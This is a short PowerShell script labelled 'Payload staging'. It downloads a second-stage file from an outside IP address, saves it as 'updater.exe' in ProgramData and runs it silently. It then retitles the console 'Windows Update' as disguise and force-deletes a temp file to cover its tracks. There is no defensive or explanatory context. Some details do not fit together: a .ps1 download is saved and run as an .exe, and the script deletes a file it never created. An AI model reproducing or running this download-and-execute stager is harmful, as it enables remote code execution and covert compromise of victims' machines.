
<# Payload staging #> $DownloadUrl = "http://203.0.113.21:8080/stage2.ps1"; $OutputPath = 'C:\ProgramData\updater.exe'; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $OutputPath); Start-Process -FilePath $OutputPath -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
